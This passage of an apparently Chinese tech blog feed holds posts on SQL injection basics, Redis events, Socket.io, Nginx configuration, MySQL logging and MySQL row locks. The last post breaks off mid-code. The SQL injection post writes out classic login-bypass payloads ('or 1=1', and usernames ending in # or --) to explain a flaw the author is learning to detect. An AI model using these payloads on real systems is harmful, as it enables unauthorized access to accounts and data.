plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE id &#x3D; -1 or 1&#x3D;1</span><br></pre></td></tr></table></figure><p>这会导致所有的学生信息都被输出了，为什么会这样呢？这是因为<code>id = -1</code>是一个不存在的条件，而<code>1 = 1</code>却是一个永远存在的条件，这就相当于没有加 Where 条件。</p><h4 id="2-字符串注入"><a href="#2-字符串注入" class="headerlink" title="2. 字符串注入"></a>2. 字符串注入</h4><p>现在有这样一种场景：<code>http://127.0.0./login.php</code>模拟用户登录。假设正确的用户名和密码是<code>Boo</code>、<code>122410</code>，那么在正常的登录情况下所执行的SQL 语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; ADN password &#x3D; &#39;122410&#39;</span><br></pre></td></tr></table></figure><p>由于用户名和密码都是字符串，所以SQL 注入会把参数携带的数据变成<code>Mysql</code>中的注释。Mysql 中的注释有两种。</p><h4 id="1"><a href="#1" class="headerlink" title="1. #"></a>1. <code>#</code></h4><p>假设<code>POST</code> 传递的参数分别是：<code>username = Boo&#39;#</code>、<code>password = xxxxxx</code>，那么产生的SQL 语句则是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;#&#39;ADN password &#x3D; &#39;xxxxxx&#39;</span><br></pre></td></tr></table></figure><p>因为<code>#</code>号 后的所有字符串都会被当成注释来处理，所以上面的SQL 语句等价于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;</span><br></pre></td></tr></table></figure><h4 id="2"><a href="#2" class="headerlink" title="2. --"></a>2. <code>--</code></h4><p>假设<code>POST</code>请求传递的参数分别是：<code>username = Boo&#39;--</code>、<code>password = xxxxxx</code>，那么产生的SQL 语句则是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;-- &#39;AND password &#x3D; &#39;xxxxxx&#39;</span><br></pre></td></tr></table></figure><p>因为<code>--</code>号 后面的所有内容都会被当成注释处理，所以上面的SQL 语句等价于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;</span><br></pre></td></tr></table></figure><p>无论是上面的哪一种情况，攻击者都能在不知道具体密码的情况下而成功登录。</p><p>这大概就是一个简单的SQL注入产生的完整过程了，这里只是抛砖引玉的介绍了下原理，而实际场景中的SQL 注入当然远远不止这两种。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/github_36032947/article/details/78442189" target="_blank" rel="noopener">SQL 注入常见方式以及检测方法</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近需要做一个检测&lt;code&gt;SQL 注入&lt;/code&gt;的功能，无奈发现自己于对&lt;code&gt;SQL 注入&lt;/code&gt;竟有点陌生，本着搞清楚原理才能更好的理解Bug 产生的原因，于是便有了这篇笔记。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
    <category term="Web 安全" scheme="https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Redis 常见事件整理</title>
    <link href="https://www.0x2beace.com/redis-common-events-collation/"/>
    <id>https://www.0x2beace.com/redis-common-events-collation/</id>
    <published>2020-07-21T15:41:45.000Z</published>
    <updated>2020-07-21T15:42:45.608Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记用来整理 Redis 的常用事件。</p><a id="more"></a><h2 id="客户端事件"><a href="#客户端事件" class="headerlink" title="客户端事件"></a>客户端事件</h2><p>客户端会发出一些事件的状态连接到Redis 服务器。</p><h3 id="Ready"><a href="#Ready" class="headerlink" title="Ready"></a>Ready</h3><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><p>客户端连接Redis 时，如果出现异常，则会触发Error 事件。</p><h3 id="Connect"><a href="#Connect" class="headerlink" title="Connect"></a>Connect</h3><p>客户端连接至Redis 时，会触发连接事件。</p><h2 id="订阅者事件"><a href="#订阅者事件" class="headerlink" title="订阅者事件"></a>订阅者事件</h2><h3 id="Message"><a href="#Message" class="headerlink" title="Message"></a>Message</h3><p>将接收到来自订阅频道的消息，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client.on(&quot;message&quot;, function (channel, message) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="Subscribe"><a href="#Subscribe" class="headerlink" title="Subscribe"></a>Subscribe</h3><p>监听订阅事件，返回订阅频道的订阅数量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client.on(&quot;subscribe&quot;, function (channel, count) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="发布-订阅"><a href="#发布-订阅" class="headerlink" title="发布/订阅"></a>发布/订阅</h2><h3 id="Publish"><a href="#Publish" class="headerlink" title="Publish"></a>Publish</h3><p>将信息 <code>message</code> 发送到指定的频道 <code>channel</code> 。</p><p>返回值：接收到信息 <code>message</code> 的订阅者数量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUBLISH channel message</span><br></pre></td></tr></table></figure><h3 id="SUBSCRIBE"><a href="#SUBSCRIBE" class="headerlink" title="SUBSCRIBE"></a>SUBSCRIBE</h3><p>订阅给定频道的信息。</p><p>返回值：接收到的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUBSCRIBE channel [channel ...]</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://redis.readthedocs.io/en/2.4/index.html" target="_blank" rel="noopener">Redis命令参考简体中文版</a></li><li><a href="https://github.com/NodeRedis/node-redis" target="_blank" rel="noopener">A high performance Node.js Redis client</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记用来整理 Redis 的常用事件。&lt;/p&gt;</summary>
    
    
    
    <category term="Redis" scheme="https://www.0x2beace.com/categories/Redis/"/>
    
    
    <category term="Redis" scheme="https://www.0x2beace.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>Socket.io 快速上手</title>
    <link href="https://www.0x2beace.com/socket-io-quick-start/"/>
    <id>https://www.0x2beace.com/socket-io-quick-start/</id>
    <published>2020-07-20T05:02:05.000Z</published>
    <updated>2020-07-20T05:04:22.840Z</updated>
    
    <content type="html"><![CDATA[<p>最近使用<code>socket.io</code> 和 <code>redis</code> 完成了一些小功能，觉得很实用，所以整理一下<code>socket.io</code>相关的知识。</p><a id="more"></a><h1 id="socket-io-是什么"><a href="#socket-io-是什么" class="headerlink" title="socket.io 是什么"></a><code>socket.io</code> 是什么</h1><p>它是一个服务端与客户端之间建立通讯的工具。</p><p>服务端创建好服务之后，客户端通过主机与之建立连接。然后就可以进行通讯了。</p><p>想要使用好<code>socket.io</code>，一定要理解通讯的概念。通讯一定是双向的，如果客户端能够收到消息，那么在某个地方就一定存在服务端向客户端推送消息。</p><h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><p>要开始使用<code>socket.io</code>进行开发，需要先安装Node和npm。</p><p>创建一个名为<code>app.js</code>的文件，并添加以下代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var app &#x3D; require(&#39;express&#39;)();</span><br><span class="line">var http &#x3D; require(&#39;http&#39;).Server(app);</span><br><span class="line">&#x2F;&#x2F; 创建一个附加到http服务器的新socket.io实例</span><br><span class="line">var io &#x3D; require(&#39;socket.io&#39;)(http);</span><br><span class="line"></span><br><span class="line">app.get(&#39;&#x2F;&#39;, function(req, res)&#123;</span><br><span class="line">  res.sendFile(__dirname + &#39;&#x2F;index.html&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">io.on(&#39;connection&#39;, function(socket)&#123;</span><br><span class="line">  console.log(&#39;a user connected&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">http.listen(3000, function()&#123;</span><br><span class="line">  console.log(&#39;listening on *:3000&#39;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这样就完成了一个最简单的<code>socket</code>服务端。</p><p>创建<code>index.html</code> 文件来作为客户端提供服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;Hello world&lt;&#x2F;title&gt;</span><br><span class="line">   &lt;&#x2F;head&gt;</span><br><span class="line">   &lt;body&gt;Hello world&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node app.js</span><br></pre></td></tr></table></figure><p>创建的服务运行在本地的 <code>3000</code> 端口上，打开浏览器，输入<code>http://localhost:3000</code>进行访问。 </p><h2 id="使用事件"><a href="#使用事件" class="headerlink" title="使用事件"></a>使用事件</h2><p><code>socket.io</code> 的核心理念就是允许发送、接收任意事件和任意数据。任意能被编码为 JSON 的对象都可以用于传输。二进制数据 也是支持的。</p><p>在上面的代码中，我们已经创建了一个服务端的<code>socket.io</code>对象，如果想要能正常通讯，还需要在客户端同样也创建一个<code>socket.io</code>对象。这个脚本由服务端的<code>/socket.io/socket.io.js</code> 提供。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;Hello world&lt;&#x2F;title&gt;</span><br><span class="line">   &lt;&#x2F;head&gt;</span><br><span class="line">   &lt;script src &#x3D; &quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">   </span><br><span class="line">   &lt;script&gt;</span><br><span class="line">      var socket &#x3D; io();</span><br><span class="line">   &lt;&#x2F;script&gt;</span><br><span class="line">   &lt;body&gt;Hello world&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>在客户端中建立 <code>socket.io</code> 连接。</p><p>在服务端中添加以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 只有有客户端连接，就会触发这个事件</span><br><span class="line">io.on(&#39;connection&#39;, function(socket) &#123;</span><br><span class="line">   console.log(&#39;A user connected&#39;);</span><br><span class="line"></span><br><span class="line">   &#x2F;&#x2F; 只有有客户端断开连接，就会触发这个事件</span><br><span class="line">   socket.on(&#39;disconnect&#39;, function () &#123;</span><br><span class="line">      console.log(&#39;A user disconnected&#39;);</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>现在再次访问<code>http://localhost:3000</code>，不仅可以在浏览器中看见<code>hello world</code>，如果刷新浏览器，还能在控制台中看见以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A user connected</span><br><span class="line">A user disconnected</span><br><span class="line">A user connected</span><br></pre></td></tr></table></figure><p>在上面的案例中，我们使用了<code>socket.io</code>的<code>connection</code>和<code>disconnect</code>事件，<code>socket.io</code>还有很多其中事件。 </p><h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><p>在服务端中有以下是保留字：</p><ul><li>Connect</li><li>Message</li><li>Disconnect</li><li>Reconnect</li><li>Ping</li><li>Join and</li><li>Leave</li></ul><p>在客户端中以下是保留字：</p><ul><li>Connect</li><li>Connect_error</li><li>Connect_timeout</li><li>Reconnect, etc</li></ul><h3 id="常用API"><a href="#常用API" class="headerlink" title="常用API"></a>常用API</h3><p>客户端 提供的一些用于处理错误/异常的API。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Connect − When the client successfully connects.</span><br><span class="line"></span><br><span class="line">Connecting − When the client is in the process of connecting.</span><br><span class="line"></span><br><span class="line">Disconnect − When the client is disconnected.</span><br><span class="line"></span><br><span class="line">Connect_failed − When the connection to the server fails.</span><br><span class="line"></span><br><span class="line">Error − An error event is sent from the server.</span><br><span class="line"></span><br><span class="line">Message − When the server sends a message using the send function.</span><br><span class="line"></span><br><span class="line">Reconnect − When reconnection to the server is successful.</span><br><span class="line"></span><br><span class="line">Reconnecting − When the client is in the process of connecting.</span><br><span class="line"></span><br><span class="line">Reconnect_failed − When the reconnection attempt fails.</span><br></pre></td></tr></table></figure><h3 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h3><p>广播意味着向所有连接的客户端发送消息。</p><p>要向所有客户端广播事件，我们可以使用<code>io.sockets.emit</code>方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  ...</span><br><span class="line"></span><br><span class="line">var clients &#x3D; 0;</span><br><span class="line">io.on(&#39;connection&#39;, function(socket) &#123;</span><br><span class="line">   clients++;</span><br><span class="line">   io.sockets.emit(&#39;broadcast&#39;,&#123; description: clients + &#39; clients connected!&#39;&#125;);</span><br><span class="line">   socket.on(&#39;disconnect&#39;, function () &#123;</span><br><span class="line">      clients--;</span><br><span class="line">      io.sockets.emit(&#39;broadcast&#39;,&#123; description: clients + &#39; clients connected!&#39;&#125;);</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">  </span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>广播在<code>socket.io</code>中应用的非常多，有广播就意味着有接收。需要在客户端中处理广播事件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;Hello world&lt;&#x2F;title&gt;</span><br><span class="line">   &lt;&#x2F;head&gt;</span><br><span class="line">   &lt;script src &#x3D; &quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">   &lt;script&gt;</span><br><span class="line">      var socket &#x3D; io();</span><br><span class="line">      socket.on(&#39;broadcast&#39;,function(data) &#123;</span><br><span class="line">         document.body.innerHTML &#x3D; &#39;&#39;;</span><br><span class="line">         document.write(data.description);</span><br><span class="line">      &#125;);</span><br><span class="line">   &lt;&#x2F;script&gt;</span><br><span class="line">   &lt;body&gt;Hello world&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>可以尝试打开多个浏览器，输入<code>http://localhost:3000</code>，可能会得到以下结果：</p><p><img src="https://www.tutorialspoint.com/socket.io/images/broadcast_to_all.jpg" alt=""></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.tutorialspoint.com/socket.io/index.htm" target="_blank" rel="noopener">Socket.io Tutorial</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近使用&lt;code&gt;socket.io&lt;/code&gt; 和 &lt;code&gt;redis&lt;/code&gt; 完成了一些小功能，觉得很实用，所以整理一下&lt;code&gt;socket.io&lt;/code&gt;相关的知识。&lt;/p&gt;</summary>
    
    
    
    <category term="Node" scheme="https://www.0x2beace.com/categories/Node/"/>
    
    <category term="Socket.io" scheme="https://www.0x2beace.com/categories/Node/Socket-io/"/>
    
    
    <category term="Socket.io" scheme="https://www.0x2beace.com/tags/Socket-io/"/>
    
  </entry>
  
  <entry>
    <title>Nginx 常见配置</title>
    <link href="https://www.0x2beace.com/nginx-common-configuration/"/>
    <id>https://www.0x2beace.com/nginx-common-configuration/</id>
    <published>2020-07-19T10:22:26.000Z</published>
    <updated>2020-07-19T10:24:25.144Z</updated>
    
    <content type="html"><![CDATA[<p>最近接触Nginx 配置比较多，所以整理一下，方便后面回顾。</p><a id="more"></a><h2 id="多站点配置"><a href="#多站点配置" class="headerlink" title="多站点配置"></a>多站点配置</h2><p>如果一台服务器，需要配置多套站点，推荐使用 <code>IP + 端口</code>配置站点，然后使用反向代理指向端口。</p><p>站点配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       40001;</span><br><span class="line">    </span><br><span class="line">    location ~ \.php &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多站点配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 站点1 </span><br><span class="line">server &#123;</span><br><span class="line">  server_name  yoursite.com;</span><br><span class="line">listen 80;</span><br><span class="line"></span><br><span class="line">  location &#x2F; &#123;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001;</span><br><span class="line">  index  index.html index.htm index.jsp index.js;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 站点2</span><br><span class="line">server &#123;</span><br><span class="line">  server_name  yoursite2.com;</span><br><span class="line">listen 80;</span><br><span class="line"></span><br><span class="line">  location &#x2F; &#123;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001;</span><br><span class="line">  index  index.html index.htm index.jsp index.js;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>反向代理其实已经在上面的配置中出现过了，多站点配置的原理就是利用反向代理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  server_name  yoursite2.com;</span><br><span class="line">listen 80;</span><br><span class="line"></span><br><span class="line">  location &#x2F; &#123;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001;</span><br><span class="line">  index  index.html index.htm index.jsp index.js;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SSL-配置"><a href="#SSL-配置" class="headerlink" title="SSL 配置"></a>SSL 配置</h2><p>申请好证书之后，将其放在服务器上，然后编辑Nginx 配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    server_name  yoursite.com;</span><br><span class="line">  </span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    ssl on;</span><br><span class="line">    ssl_certificate ssl_0123cp_net&#x2F;full_chain.pem;  &#x2F;&#x2F; 证书所在路径</span><br><span class="line">    ssl_certificate_key ssl_0123cp_net&#x2F;private.key;  &#x2F;&#x2F; 证书对应的私钥所在路径</span><br><span class="line">  </span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001;</span><br><span class="line">        index  index.html index.htm index.jsp index.js;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="http重定向"><a href="#http重定向" class="headerlink" title="http重定向"></a>http重定向</h2><p>配置好 <code>https</code>之后，还需要做一件事，才能保证 <code>https</code>能够正常访问。</p><p>因为访问任何一个网站时，默认使用的是<code>http</code>协议，所以需要在<code>Web Server</code>中配置<code>http</code> 自动跳转 <code>https</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    server_name yoursite.com;</span><br><span class="line">  </span><br><span class="line">    listen 80;</span><br><span class="line">    rewrite ^(.*) https:&#x2F;&#x2F;$server_name$1 permanent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近接触Nginx 配置比较多，所以整理一下，方便后面回顾。&lt;/p&gt;</summary>
    
    
    
    <category term="Nginx" scheme="https://www.0x2beace.com/categories/Nginx/"/>
    
    
    <category term="Nginx" scheme="https://www.0x2beace.com/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>Mac 开启 Mysql 日志记录</title>
    <link href="https://www.0x2beace.com/mac-open-mysql-logging/"/>
    <id>https://www.0x2beace.com/mac-open-mysql-logging/</id>
    <published>2020-07-19T09:24:43.000Z</published>
    <updated>2020-07-20T05:06:44.373Z</updated>
    
    <content type="html"><![CDATA[<p>有时候可能会想在本地开启Mysql 的日志记录，看看具体都执行了哪些SQL，其实非常简单。</p><a id="more"></a><ol><li>进入Mysql 命令行</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -hlocalhost -uroot -p</span><br></pre></td></tr></table></figure><ol start="2"><li>全局开启普通日志记录</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log&#x3D;on;</span><br></pre></td></tr></table></figure><ol start="3"><li>查看Mysql 日志文件所在目录</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;general_log_file&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719172134.png" alt=""></p><ol start="4"><li>实时查看日志记录</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f &#x2F;your_mysql_log_file_path</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;有时候可能会想在本地开启Mysql 的日志记录，看看具体都执行了哪些SQL，其实非常简单。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
    <category term="Mac" scheme="https://www.0x2beace.com/tags/Mac/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 行锁原因分析</title>
    <link href="https://www.0x2beace.com/analysis-of-the-causes-of-mysql-row-lock/"/>
    <id>https://www.0x2beace.com/analysis-of-the-causes-of-mysql-row-lock/</id>
    <published>2020-07-19T09:03:04.000Z</published>
    <updated>2020-07-19T09:11:47.872Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章来浅谈一下什么是Mysql 行锁，以及产生行锁的原因。</p><a id="more"></a><h1 id="锁的分类"><a href="#锁的分类" class="headerlink" title="锁的分类"></a>锁的分类</h1><p>MySQL有三种锁的级别：页级、表级、行级。</p><ul><li>表级锁：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高,并发度最低。</li><li>行级锁：开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低,并发度也最高。</li><li>页面锁：开销和加锁时间界于表锁和行锁之间；会出现死锁；锁定粒度界于表锁和行锁之间，并发度一般</li></ul><p>因为这篇笔记只介绍Mysql 行锁，所以这里不对其他类型的锁做介绍了。</p><h2 id="行锁"><a href="#行锁" class="headerlink" title="行锁"></a>行锁</h2><p>InnoDB实现了两种类型的行锁:</p><ul><li>共享锁【S锁】又称读锁，若事务T对数据对象A加上S锁，则事务T可以读A但不能修改A，其他事务只能再对A加S锁，而不能加X锁，直到T释放A上的S锁。这保证了其他事务可以读A，但在T释放A上的S锁之前不能对A做任何修改。</li><li>排他锁【X锁】又称写锁。若事务T对数据对象A加上X锁，事务T可以读A也可以修改A，其他事务不能再对A加任何锁，直到T释放A上的锁。这保证了其他事务在T释放A上的锁之前不能再读取和修改A。</li></ul><blockquote><p>所谓X锁,是事务T对数据A加上X锁时,只允许事务T读取和修改数据A; 所谓S锁,是事务T对数据A加上S锁时,其他事务只能再对数据A加S锁,而不能加X锁,直到T释放A上的S锁</p></blockquote><h2 id="场景重现"><a href="#场景重现" class="headerlink" title="场景重现"></a>场景重现</h2><ol><li>首先创建一个 <code>InnoDB</code>类型的数据表，SQL 如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;gap&#96; (</span><br><span class="line">  &#96;id&#96; int(11) DEFAULT NULL,</span><br><span class="line">  KEY &#96;ind_gap_id&#96; (&#96;id&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br></pre></td></tr></table></figure><ol start="2"><li>创建会话1，开启事务A并执行update 语句</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start transaction;</span><br><span class="line">update gap set id &#x3D; 30 where id &#x3D; 33;</span><br></pre></td></tr></table></figure><ol start="3"><li>创建会话2，开启事务B并执行另一个update 语句</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start transaction;</span><br><span 